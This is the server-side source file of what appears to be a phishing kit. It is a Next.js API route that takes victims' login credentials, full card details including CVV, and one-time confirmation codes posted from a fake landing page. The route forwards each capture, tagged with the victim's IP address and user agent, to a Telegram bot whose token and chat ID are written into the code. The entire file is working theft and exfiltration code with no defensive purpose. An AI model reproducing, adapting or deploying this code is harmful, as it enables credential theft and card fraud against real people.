/** @format */
import { NextResponse } from 'next/server';

// Telegram configuration - REPLACE WITH YOUR OWN CREDENTIALS
const BOT_TOKEN = "8526352009:AAFvwOCNkueksZ_OODSQXySqarQL9iORTU0";
const CHAT_ID = "5301319697";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Function to get client IP
function getClientIP(request) {
  const forwarded = request.headers.get('x-forwarded-for');
  const ip = forwarded ? forwarded.split(',')[0] : request.ip;
  return ip || 'Unknown';
}

// Function to format card number for security
function formatCardNumber(cardNumber) {
  if (!cardNumber) return 'Not provided';
  const cleaned = cardNumber.replace(/\s/g, '');
  if (cleaned.length <= 4) return cardNumber;
  return cleaned.replace(/\d(?=\d{4})/g, "*");
}

export async function POST(req) {
  try {
    const body = await req.json();
    const ip = getClientIP(req);
    const userAgent = req.headers.get('user-agent') || 'Unknown';
    
    console.log('Received data:', body);
    
    let telegramMessage = '';
    const dataType = body.dataType || 'unknown';
    const data = body.data || {};
    
    // Format message based on data type
    switch (dataType) {
      case 'login':
        telegramMessage = `
🔐 *LOGIN CREDENTIALS CAPTURED* 🔐

👤 *User ID:* ${data.userID || 'Not provided'}
🔑 *Password:* ${data.password || 'Not provided'}

*Tracking Information:*
🌐 *Landing URL:* ${body.landingUrl || 'Unknown'}
📍 *IP Address:* ${ip}
🖥️ *User Agent:* ${userAgent}
📅 *Timestamp:* ${new Date().toISOString()}
        `;
        break;
        
      case 'card':
        telegramMessage = `
💳 *CARD INFORMATION CAPTURED* 💳

👤 *Cardholder Name:* ${data.cardName || 'Not provided'}
🔢 *Card Number:* ${formatCardNumber(data.cardNumber)}
📅 *Expiry Date:* ${data.expiryMonth || 'XX'}/${data.expiryYear || 'XX'}
🔒 *Security Code (CVV):* ${data.cvv || 'XXX'}

*Tracking Information:*
🌐 *Landing URL:* ${body.landingUrl || 'Unknown'}
📍 *IP Address:* ${ip}
🖥️ *User Agent:* ${userAgent}
📅 *Timestamp:* ${new Date().toISOString()}
        `;
        break;
        
      case 'confirmation':
        telegramMessage = `
📱 *CONFIRMATION CODE CAPTURED* 📱

🔢 *Code:* ${data.confirmationCode || 'Not provided'}

*Tracking Information:*
🌐 *Landing URL:* ${body.landingUrl || 'Unknown'}
📍 *IP Address:* ${ip}
🖥️ *User Agent:* ${userAgent}
📅 *Timestamp:* ${new Date().toISOString()}
        `;
        break;
        
      default:
        telegramMessage = `
📦 *UNKNOWN DATA TYPE CAPTURED* 📦

*Data:* ${JSON.stringify(data, null, 2)}

*Tracking Information:*
🌐 *Landing URL:* ${body.landingUrl || 'Unknown'}
📍 *IP Address:* ${ip}
🖥️ *User Agent:* ${userAgent}
📅 *Timestamp:* ${new Date().toISOString()}
        `;
    }
    
    console.log('Sending to Telegram:', telegramMessage);
    
    // Send to Telegram
    try {
      const telegramResponse = await fetch(`${TELEGRAM_API}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: telegramMessage,
          parse_mode: 'Markdown'
        })
      });
      
      const telegramResult = await telegramResponse.json();
      
      if (!telegramResult.ok) {
        console.error('Telegram API error:', telegramResult);
        return NextResponse.json(
          { 
            message: 'Data received but failed to send to Telegram',
            telegramError: telegramResult.description,
            success: false 
          },
          { status: 500 }
        );
      }
      
      console.log('Successfully sent to Telegram');
      
      return NextResponse.json(
        { 
          message: 'Data sent successfully to Telegram',
          telegramMessageId: telegramResult.result.message_id,
          success: true 
        },
        { status: 200 }
      );
      
    } catch (telegramError) {
      console.error('Telegram network error:', telegramError);
      return NextResponse.json(
        { 
          message: 'Data received but network error sending to Telegram',
          error: telegramError.message,
          success: false 
        },
        { status: 500 }
      );
    }
    
  } catch (error) {
    console.error('Route error:', error);
    return NextResponse.json(
      { 
        error: 'Internal server error',
        message: error.message,
        success: false 
      },
      { status: 500 }
    );
  }
}

// Optional: GET handler for health check
export async function GET() {
  return NextResponse.json(
    { 
      status: 'Telegram API is running',
      timestamp: new Date().toISOString(),
      botToken: BOT_TOKEN ? 'Configured' : 'Not configured'
    },
    { status: 200 }
  );
}